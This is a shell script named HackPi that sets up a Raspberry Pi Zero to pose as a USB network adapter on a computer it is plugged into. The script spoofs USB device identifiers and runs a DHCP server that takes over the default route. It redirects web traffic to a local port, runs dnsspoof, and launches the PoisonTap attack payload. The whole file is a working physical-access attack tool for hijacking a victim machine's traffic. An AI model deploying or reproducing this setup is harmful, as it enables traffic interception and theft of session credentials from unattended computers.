#!/bin/sh
#
# HackPi
#  by wismna
#  http://github.com/wismna/raspberry-pi/hackpi
#  14/01/2017
#

cd /sys/kernel/config/usb_gadget/
mkdir -p hackpi
cd hackpi

OS=`cat /home/pi/os.txt`
HOST="48:6f:73:74:50:43"
SELF0="42:61:64:55:53:42"
SELF1="42:61:64:55:53:43"

echo 0x04b3 > idVendor
echo 0x4010 > idProduct

echo 0x0100 > bcdDevice # v1.0.0
mkdir -p strings/0x409
echo "badc0deddeadbeef" > strings/0x409/serialnumber
echo "wismna" > strings/0x409/manufacturer
echo "PiZero" > strings/0x409/product

if [ "$OS" != "MacOs" ]; then
	# Config 1: RNDIS
	mkdir -p configs/c.1/strings/0x409
	echo "0x80" > configs/c.1/bmAttributes
	echo 250 > configs/c.1/MaxPower
	echo "Config 1: RNDIS network" > configs/c.1/strings/0x409/configuration

	echo "1" > os_desc/use
	echo "0xcd" > os_desc/b_vendor_code
	echo "MSFT100" > os_desc/qw_sign

	mkdir -p functions/rndis.usb0
	echo $SELF0 > functions/rndis.usb0/dev_addr
	echo $HOST > functions/rndis.usb0/host_addr
	echo "RNDIS" > functions/rndis.usb0/os_desc/interface.rndis/compatible_id
	echo "5162001" > functions/rndis.usb0/os_desc/interface.rndis/sub_compatible_id
fi

# Config 2: CDC ECM
mkdir -p configs/c.2/strings/0x409
echo "Config 2: ECM network" > configs/c.2/strings/0x409/configuration
echo 250 > configs/c.2/MaxPower

mkdir -p functions/ecm.usb0
# first byte of address must be even
echo $HOST > functions/ecm.usb0/host_addr
echo $SELF1 > functions/ecm.usb0/dev_addr

# Create the CDC ACM function
mkdir -p functions/acm.gs0

# Link everything and bind the USB device
if [ "$OS" != "MacOs" ]; then
	ln -s configs/c.1 os_desc
	ln -s functions/rndis.usb0 configs/c.1
fi

ln -s functions/ecm.usb0 configs/c.2
ln -s functions/acm.gs0 configs/c.2
# End functions
ls /sys/class/udc > UDC

# Start bridge interface
ifup br0
ifconfig br0 up

# Start the DHCP server
/sbin/route add -net 0.0.0.0/0 br0
/etc/init.d/isc-dhcp-server start
# Set some other paramaters
/sbin/sysctl -w net.ipv4.ip_forward=1
/sbin/iptables -t nat -A PREROUTING -i br0 -p tcp --dport 80 -j REDIRECT --to-port 1337
# Start some servers
/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i br0 port 53
/usr/bin/screen -dmS node /usr/bin/nodejs /home/pi/poisontap/pi_poisontap.js 

# Enable Serial
systemctl enable getty@ttyGS0.service
